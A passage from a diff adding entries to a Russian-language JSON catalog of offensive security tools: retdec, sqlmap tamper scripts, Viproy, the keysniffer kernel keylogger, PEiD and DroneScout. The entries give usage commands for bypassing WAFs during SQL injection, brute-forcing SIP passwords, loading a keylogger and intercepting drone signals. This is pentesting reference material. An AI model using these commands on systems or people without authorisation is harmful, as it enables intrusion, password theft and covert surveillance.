+      {"title": "Декомпиляция", "command": "retdec-decompiler binary", "description": "Декомпилировать бинарный файл в C-код"},
+      {"title": "Только определённые функции", "command": "retdec-decompiler --select-functions main binary", "description": "Декомпилировать только функцию main"}
+    ],
+    "parameters": [
+      {"flag": "--select-functions", "description": "Декомпилировать только указанные функции"},
+      {"flag": "--select-ranges", "description": "Декомпилировать указанные диапазоны адресов"},
+      {"flag": "-o", "description": "Выходной файл"}
+    ]
+  },
+  {
+    "id": "sqlmap-tamper",
+    "name": "sqlmap (Tamper Scripts)",
+    "version": "1.8",
+    "categories": ["blackarch-database", "blackarch-webapp"],
+    "description": "Extended SQLMap tamper scripts for WAF bypass",
+    "descriptionRu": "Расширенные tamper-скрипты SQLMap для обхода WAF при SQL-инъекциях",
+    "helpRu": "SQLMap Tamper Scripts — скрипты модификации пейлоадов для обхода WAF и фильтров.\n\nПопулярные tamper-скрипты:\n- space2comment: замена пробелов на SQL-комментарии\n- between: замена > на BETWEEN\n- randomcase: случайный регистр\n- base64encode: Base64 кодирование\n- charencode: URL-кодирование символов",
+    "url": "https://sqlmap.org/",
+    "command": "sqlmap",
+    "usageExamples": [
+      {"title": "С обходом WAF", "command": "sqlmap -u 'https://example.com/?id=1' --tamper=space2comment,between", "description": "SQL-инъекция с tamper-скриптами"},
+      {"title": "Список tamper-скриптов", "command": "sqlmap --list-tampers", "description": "Показать все доступные tamper-скрипты"}
+    ],
+    "parameters": [
+      {"flag": "--tamper", "description": "Tamper-скрипты (через запятую)"},
+      {"flag": "--list-tampers", "description": "Показать все tamper-скрипты"},
+      {"flag": "--random-agent", "description": "Случайный User-Agent"}
+    ]
+  },
+  {
+    "id": "viproy",
+    "name": "Viproy",
+    "version": "2.0",
+    "categories": ["blackarch-voip"],
+    "description": "VoIP penetration testing and exploitation framework",
+    "descriptionRu": "Фреймворк для пентеста и эксплуатации VoIP-систем (SIP, RTP)",
+    "helpRu": "Viproy — набор модулей для Metasploit, предназначенный для тестирования VoIP-инфраструктуры.\n\nВозможности:\n- SIP enumeration и brute-force\n- SIP trust hacking\n- SRTP захват и дешифрование\n- Cisco CDP spoof",
+    "url": "https://github.com/fozavci/viproy-voipkit",
+    "command": "msfconsole",
+    "usageExamples": [
+      {"title": "SIP перечисление", "command": "use auxiliary/voip/viproy_sip_enumerator", "description": "Перечисление SIP-аккаунтов"},
+      {"title": "SIP brute-force", "command": "use auxiliary/voip/viproy_sip_bruteforce", "description": "Подбор паролей SIP"}
+    ],
+    "parameters": [
+      {"flag": "RHOSTS", "description": "Целевой SIP-сервер"},
+      {"flag": "MINEXT/MAXEXT", "description": "Диапазон SIP-номеров"}
+    ]
+  },
+  {
+    "id": "keysniffer",
+    "name": "keysniffer",
+    "version": "1.0",
+    "categories": ["blackarch-keylogger", "blackarch-sniffer"],
+    "description": "Linux kernel module to capture keystrokes",
+    "descriptionRu": "Модуль ядра Linux для перехвата нажатий клавиш",
+    "helpRu": "keysniffer — загружаемый модуль ядра Linux (LKM), который перехватывает нажатия клавиатуры через keyboard notifier.\n\nОсобенности:\n- Работает на уровне ядра\n- Логирует в /var/log/kern.log\n- Для образовательных целей",
+    "url": "https://github.com/jarun/keysniffer",
+    "command": "insmod keysniffer.ko",
+    "usageExamples": [
+      {"title": "Загрузить модуль", "command": "sudo insmod keysniffer.ko", "description": "Загрузить keylogger в ядро"},
+      {"title": "Просмотр логов", "command": "dmesg | tail -20", "description": "Просмотр перехваченных нажатий"}
+    ],
+    "parameters": [
+      {"flag": "insmod", "description": "Загрузить модуль в ядро"},
+      {"flag": "rmmod", "description": "Выгрузить модуль из ядра"}
+    ]
+  },
+  {
+    "id": "peid",
+    "name": "PEiD",
+    "version": "0.95",
+    "categories": ["blackarch-packer", "blackarch-reversing"],
+    "description": "PE file packer/cryptor/compiler detector",
+    "descriptionRu": "Детектор упаковщиков, крипторов и компиляторов PE-файлов",
+    "helpRu": "PEiD — утилита для определения упаковщиков (UPX, ASPack, Themida и др.), крипторов и компиляторов исполняемых PE-файлов.\n\nВозможности:\n- 600+ сигнатур упаковщиков\n- Плагины для распаковки\n- Анализ секций PE",
+    "url": "https://github.com/wolfram77web/app-peid",
+    "command": "peid",
+    "usageExamples": [
+      {"title": "Сканировать файл", "command": "peid sample.exe", "description": "Определить упаковщик PE-файла"},
+      {"title": "Глубокое сканирование", "command": "peid -deep sample.exe", "description": "Глубокий анализ с расширенными сигнатурами"}
+    ],
+    "parameters": [
+      {"flag": "-deep", "description": "Глубокое сканирование"},
+      {"flag": "-scan", "description": "Быстрое сканирование"}
+    ]
+  },
+  {
+    "id": "dronescout",
+    "name": "DroneScout",
+    "version": "1.0",
+    "categories": ["blackarch-drone", "blackarch-wireless"],
+    "description": "Drone detection and identification via Wi-Fi and RF signals",
+    "descriptionRu": "Обнаружение и идентификация дронов через Wi-Fi и RF-сигналы",
+    "helpRu": "DroneScout — инструмент для обнаружения дронов по их Wi-Fi и радиочастотным сигналам.\n\nВозможности:\n- Пассивный мониторинг Wi-Fi (DJI, Parrot и др.)\n- Определение модели дрона\n- Извлечение серийного номера и GPS",
+    "url": "https://github.com/AresValley/DroneScout",
+    "command": "dronescout",
+    "usageExamples": [
+      {"title": "Сканирование Wi-Fi", "command": "dronescout --iface wlan0mon", "description": "Мониторинг дронов через Wi-Fi интерфейс"},
+      {"title": "Захват RemoteID", "command": "dronescout --remoteid --iface wlan0mon", "description": "Перехват RemoteID сигналов дронов"}
+    ],
+    "parameters": [
+      {"flag": "--iface", "description": "Сетевой интерфейс для мониторинга"},
+      {"flag": "--remoteid", "description": "Режим перехвата RemoteID"}
+    ]
   }
 ]
